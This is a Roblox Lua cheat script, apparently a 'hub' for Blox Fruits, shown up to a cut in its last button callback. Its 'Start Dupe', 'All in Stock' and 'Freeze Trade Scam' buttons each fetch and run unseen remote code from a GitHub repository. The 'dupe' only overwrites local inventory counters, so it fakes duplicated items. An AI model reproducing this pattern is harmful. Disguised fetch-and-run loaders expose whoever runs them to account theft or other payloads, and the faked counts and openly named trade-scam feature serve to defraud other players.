local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/Loco-CTO/UI-Library/main/VisionLibV2/source.lua'))()

local Window = Library:Create({
    Name = "SMN'S HUB",
    Footer = "By SMN",
    ToggleKey = Enum.KeyCode.RightShift,
    LoadedCallback = function()
        Window:TaskBarOnly(false)
    end,
    KeySystem = false,
    DiscordLink = nil,
})

local MainTab = Window:Tab({
    Name = "Main Features",
    Icon = "rbxassetid://4483345998",
    Color = Color3.fromRGB(255, 0, 0),
})

local OtherScriptsTab = Window:Tab({
    Name = "Other Scripts",
    Icon = "rbxassetid://4483345998",
    Color = Color3.fromRGB(0, 255, 0),
})

local DupeSection = MainTab:Section({ Name = "Dupe Fruit" })
local ExtraSection = MainTab:Section({ Name = "Extra Features" })
local OtherScriptsSection = OtherScriptsTab:Section({ Name = "Other Hubs" })

local selectedNumber = ""
DupeSection:SmallTextbox({
    Name = "Enter Dupe Number",
    Default = "",
    Callback = function(Value)
        selectedNumber = tonumber(Value)
        print("Selected Dupe Number: " .. tostring(selectedNumber))
    end,
})

DupeSection:Button({
    Name = "Start Dupe",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()

        if selectedNumber then
            print("Starting dupe with number: " .. selectedNumber)
            Library:Notify({
                Name = "Dupe Started",
                Text = "Dupe initiated with number " .. selectedNumber,
                Icon = "rbxassetid://4483345998",
                Duration = 5,
            })

            for i = 1, 5000 do
                local itemFrame = game:GetService("Players").LocalPlayer.PlayerGui.Main.InventoryContainer.Right.Content.ScrollingFrame.Frame[tostring(i)]
                if itemFrame then
                    local itemCounterText = itemFrame.Filled.ItemInformation.Counter.Shadow.TextLabel
                    itemCounterText.Text = tostring(selectedNumber)
                    itemCounterText:GetPropertyChangedSignal("Text"):Connect(function()
                        if itemCounterText.Text ~= tostring(selectedNumber) then
                            itemCounterText.Text = tostring(selectedNumber)
                        end
                    end)
                end
            end
        else
            Library:Notify({
                Name = "Error",
                Text = "Please enter a valid number first!",
                Icon = "rbxassetid://4483345998",
                Duration = 5,
            })
        end
    end,
})

ExtraSection:Button({
    Name = "All in Stock",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
        Library:Notify({
            Name = "Feature Activated",
            Text = "All in Stock is now active!",
            Icon = "rbxassetid://4483345998",
            Duration = 5,
        })
    end,
})

ExtraSection:Button({
    Name = "Freeze Trade Scam",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
        Library:Notify({
            Name = "Feature Activated",
            Text = "Freeze Trade Scam is now active!",
            Icon = "rbxassetid://4483345998",
            Duration = 5,
        })
